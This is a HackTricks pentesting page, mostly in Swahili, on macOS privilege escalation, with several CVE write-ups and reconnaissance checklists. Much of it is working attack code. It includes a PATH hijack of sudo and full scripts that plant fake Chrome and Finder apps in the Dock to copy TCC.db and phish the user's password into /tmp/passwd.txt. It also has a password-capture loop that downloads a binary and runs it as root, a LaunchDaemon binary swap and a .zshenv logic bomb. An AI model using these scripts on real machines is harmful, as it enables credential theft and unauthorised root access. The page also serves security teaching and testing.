# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Mbinu nyingi za privilege escalation zinazoathiri Linux au mifumo mingine inayofanana na Unix zinatumika pia kwa macOS. Tazama:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Mwingiliano wa Mtumiaji

### Sudo Hijacking

Unaweza kupata mbinu asili ya [Sudo Hijacking kwenye chapisho la Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Hata hivyo, macOS **huhifadhi** **`PATH`** ya mtumiaji anapotumia **`sudo`**. Hii inamaanisha kuwa njia nyingine ya kutekeleza shambulio hili ni **kuteka nyara binaries nyingine** ambazo mwathiriwa bado atatekeleza anapoendesha **sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Kumbuka kwamba mtumiaji anayetumia terminal huenda sana akawa **amesakinisha Homebrew**. Kwa hiyo, inawezekana kufanya hijack ya binaries katika **`/opt/homebrew/bin`**.

### Dock Impersonation

Kwa kutumia **social engineering**, unaweza **kuiga, kwa mfano, Google Chrome** ndani ya dock na kwa kweli kutekeleza script yako mwenyewe:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Baadhi ya mapendekezo:

- Angalia kwenye Dock kama kuna Chrome, na ikiwa ipo, **iondoe** entry hiyo na **uongeze** entry **fake** ya **Chrome katika nafasi ileile** kwenye array ya Dock.

<details>
<summary>Chrome Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Baadhi ya mapendekezo:

- **Huwezi kuondoa Finder kwenye Dock**, kwa hivyo ukiamua kuiweka kwenye Dock, unaweza kuweka Finder bandia karibu kabisa na Finder halisi. Ili kufanya hivyo, unahitaji **kuongeza ingizo la Finder bandia mwanzoni mwa safu ya Dock**.
- Chaguo jingine ni kutoiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
- Chaguo jingine la **kupata root bila kuuliza** password kupitia kisanduku cha mazungumzo kibaya ni kuifanya Finder iombe password kwa kweli ili kutekeleza kitendo kinachohitaji ruhusa za juu:
  - Iambie Finder inakili faili mpya ya **`sudo`** kwenye **`/etc/pam.d`** (Kidokezo cha kuomba password kitaonyesha kwamba "Finder wants to copy sudo")
  - Iambie Finder inakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili kidokezo cha kuomba password kionyeshe kwamba "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing ya kidokezo cha password + kutumia tena sudo

Malware mara nyingi hutumia mwingiliano wa mtumiaji **kunasa password inayoweza kutumia sudo** na kuitumia tena kupitia programu. Mtiririko wa kawaida:

1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
2. **Rudia maombi ya password** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
3. Hifadhi credential kwenye cache (kwa mfano, `/tmp/.pass`) na uendeshe vitendo vinavyohitaji ruhusa za juu kwa kutumia `sudo -S` (password kupitia stdin).

Mlolongo mfupi wa mfano:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Nenosiri lililoibwa linaweza kutumiwa tena **kuondoa quarantine ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye ruhusa za juu, na kuendesha hatua za ziada bila mwingiliano wa mtumiaji.<sup>[[1]](#references)</sup>

## Mbinu mpya mahususi za macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` iliyopitwa na wakati bado inaweza kutumika

`AuthorizationExecuteWithPrivileges` ilipitwa na wakati katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Visasishaji vingi vya kibiashara huendesha `/usr/libexec/security_authtrampoline` vikiwa na njia isiyoaminika. Ikiwa binary inayolengwa inaweza kuandikwa na mtumiaji, unaweza kuweka trojan na kutumia prompt halali:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Unganisha na **mbinu za kujifanya hapo juu** ili kuonyesha kisanduku cha mazungumzo cha nenosiri kinachoaminika.

### Uchunguzi wa awali wa helper yenye ruhusa za juu / XPC

MacOS privesc nyingi za kisasa za wahusika wengine hufuata muundo uleule: **LaunchDaemon ya root** hutoa **huduma ya Mach/XPC** kutoka **`/Library/PrivilegedHelperTools`**, kisha helper ama **haithibitishi client**, huithibitisha **ikiwa tayari ni kuchelewa** (race ya PID), au hutoa **mbinu ya root** inayotumia **path/script inayodhibitiwa na mtumiaji**. Aina hii ya hitilafu ndiyo chanzo cha hitilafu nyingi za hivi karibuni katika helper za wateja wa VPN, vizindua michezo na visasishaji.<sup>[[2]](#references)</sup>

Orodha ya haraka ya ukaguzi wa awali:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Zingatia hasa helpers ambazo:

- zinaendelea kukubali maombi **baada ya kuondoa programu** kwa sababu job ilibaki imepakiwa kwenye `launchd`
- zinatekeleza scripts au kusoma usanidi kutoka **`/Applications/...`** au njia nyingine zinazoweza kuandikwa na watumiaji wasio root
- zinategemea uthibitishaji wa peer kwa **PID** au **bundle-id pekee**, ambao unaweza kukabiliwa na race condition

Kwa maelezo zaidi kuhusu hitilafu za uidhinishaji wa helper, angalia [ukurasa huu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Urithi wa mazingira ya script ya PackageKit (CVE-2024-27822)

Kabla Apple haijarekebisha tatizo hili katika **Sonoma 14.5**, **Ventura 13.6.7** na **Monterey 12.7.5**, usakinishaji ulioanzishwa na mtumiaji kupitia **`Installer.app`** / **`PackageKit.framework`** ungeweza kutekeleza scripts za PKG kama root ndani ya mazingira ya mtumiaji wa sasa. Hiyo inamaanisha kuwa package inayotumia **`#!/bin/zsh`** ingepakia **`~/.zshenv`** ya mshambulizi na kuiendesha kama **root** wakati mtu anayelengwa akisakinisha package hiyo.<sup>[[3]](#references)</sup>

Hili linavutia hasa kama **logic bomb**: unahitaji tu kupata foothold kwenye akaunti ya mtumiaji na faili ya kuanzisha shell inayoweza kuandikwa, kisha unasubiri installer yoyote iliyo hatarini inayotumia **zsh** iendeshwe na mtumiaji. Hili kwa ujumla **halitumiki** kwa deployments za **MDM/Munki**, kwa sababu hizo huendeshwa ndani ya mazingira ya mtumiaji root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Ikiwa unataka maelezo ya kina zaidi kuhusu matumizi mabaya mahususi ya installer, angalia pia [ukurasa huu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Mgongano wa eneo lengwa la installer kupitia `.localized`

Baadhi ya installers za wahusika wengine husajili LaunchDaemon ya root ambayo executable yake inaelekezwa kwa path isiyobadilika ndani ya `/Applications/Target.app`. Ikiwa mshambuliaji anaweza kuunda bundle hiyo kwanza kwa **bundle identifier tofauti**, Installer inaweza kuhifadhi decoy na kuweka app halisi katika `/Applications/Target.localized/Target.app`. Daemon bado inaelekeza kwenye path ya awali. Kwa hiyo, executable inayodhibitiwa na mshambuliaji ndani ya decoy bundle inaweza kuendeshwa baadaye kama root.<sup>[[8]](#references)</sup>

Masharti muhimu ya awali ni:<sup>[[8]](#references)</sup>

1. Mshambuliaji anaweza kuunda au kudhibiti path ya programu inayotarajiwa.
2. Package haiondoi bundle inayokinzana.
3. Job yenye mamlaka ya juu hutumia path iliyowekwa moja kwa moja ndani ya bundle hiyo.
4. Mtumiaji au workflow ya MDM husakinisha package na kusajili job hiyo.

Tafuta bundles zilizohamishwa, kisha kagua malengo ya LaunchDaemon ukitumia loop ya enumeration katika sehemu inayofuata:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Kisakinishi salama zaidi hutatua eneo la mwisho la bundle na huhifadhi executable zenye ruhusa za juu katika eneo linalomilikiwa na root, kama vile `/Library/PrivilegedHelperTools`. Pia kinapaswa kuthibitisha umiliki na code signing kabla ya kusajili au kuanzisha job.<sup>[[8]](#references)</sup>

### Utekaji wa target ya LaunchDaemon inayoweza kuandikwa

plist ya LaunchDaemon inaweza kumilikiwa na root huku `Program` au ingizo la kwanza la `ProgramArguments` likielekeza kwenye directory inayoweza kuandikwa na mtumiaji. Kagua **path nzima**, si ruhusa za executable pekee. Ikiwa directory mama inaweza kuandikwa, mshambuliaji anaweza kubadilisha jina la executable inayomilikiwa na root na kuweka nyingine badala yake kwenye path hiyohiyo. Executable hiyo mbadala huendeshwa kama root job inapoanza tena. Kuwasha upya mfumo au kuanzisha upya huduma kwa kawaida kunatosha. Mshambuliaji hahitaji ruhusa ya kuendesha `launchctl bootstrap` katika system domain.<sup>[[7]](#references)</sup>

Orodhesha kila target na directory yake mama ya moja kwa moja kwanza:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Ikiwa faili au folda yake ya mzazi inaweza kuandikwa, hifadhi binary ya awali na ubadilishe njia hiyo kwa payload inayoweza kutekelezwa. Kisha subiri daemon ambayo tayari imepakiwa ianze upya.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR credential-pointer race (CVE-2025-24118)

Njia ya `kauth_cred_proc_update` yenye hitilafu ilis更新isha `proc_ro.p_ucred` kwa kutumia API isiyo ya atomiki ya `zalloc_ro_mut`, huku wasomaji wa SMR wakisoma kielekezi bila kufunga. Njia ya kuanzisha hitilafu hadharani hutumia binary ya `setgid` iliyoandaliwa mahususi. Thread moja hubadilisha kati ya group ID zake halisi na zinazotumika huku thread nyingine ikiingia mara kwa mara kwenye syscall kama `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Ichukulie hii kama **race primitive**, si root exploit iliyo tayari kutumika. PoC iliyochapishwa inaonyesha torn credential pointer. Mara nyingi huishia kwenye kernel panic. Mtafiti aliweza kuzalisha corruption kwenye Intel pekee na hakutoa udhibiti thabiti wa credential object inayotokana nayo. Apple ilibadilisha update hiyo kuwa atomic pointer exchange kwenye macOS 15.3.<sup>[[4]](#references)</sup>

### SIP bypass kupitia Migration assistant ("Migraine", CVE-2023-32369)

Hata ukiwa tayari na root, SIP bado huzuia uandishi kwenye maeneo ya mfumo. Bug ya **Migraine** hutumia entitlement ya Migration Assistant `com.apple.rootless.install.heritable` kuzindua child process inayorithi SIP bypass na kubadilisha njia zilizolindwa (kwa mfano, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Mlolongo huo:

1. Pata root kwenye mfumo unaotumika.
2. Washa `systemmigrationd` kwa hali iliyotengenezwa ili iendeshe binary inayodhibitiwa na mshambuliaji.
3. Tumia entitlement iliyorithiwa kurekebisha faili zinazolindwa na SIP; mabadiliko hayo hubaki hata baada ya kuwasha upya.

### NSPredicate/XPC expression smuggling (aina ya bug ya CVE-2023-23530/23531)

Daemons nyingi za Apple hukubali objects za **NSPredicate** kupitia XPC na hukagua tu sehemu ya `expressionType`, ambayo mshambuliaji anaweza kuidhibiti. Kwa kutengeneza predicate inayotathmini selectors kiholela, unaweza kupata **code execution katika root/system XPC services** (kwa mfano, `coreduetd`, `contextstored`). Ikichanganywa na njia ya awali ya kukwepa app sandbox, hii huwezesha **privilege escalation bila maombi ya mtumiaji**. Tafuta XPC endpoints zinazodeserialize predicates na zisizo na visitor imara.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass na privilege escalation

**Mtumiaji yeyote** (hata asiye na privileges) anaweza kuunda na ku-mount snapshot ya Time Machine kwa kutumia `-o noowners` na **kufikia faili ZOTE** za snapshot hiyo, hivyo kukwepa ukaguzi wa umiliki kwenye volume inayotumika. Privilege pekee inayohitajika ni kwa application inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Commands na maelezo kamili yako kwenye ukurasa wa TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Taarifa Nyeti

Hii inaweza kusaidia kuongeza privileges:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Privilege Escalation ya ndani kupitia AWS Client VPN ya macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege Escalation ya macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Aina Mpya ya Bug ya Privilege Escalation kwenye macOS na iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Utekaji wa LaunchDaemon: privilege escalation na persistence kupitia ruhusa zisizo salama za folda](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE kupitia directory ya .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
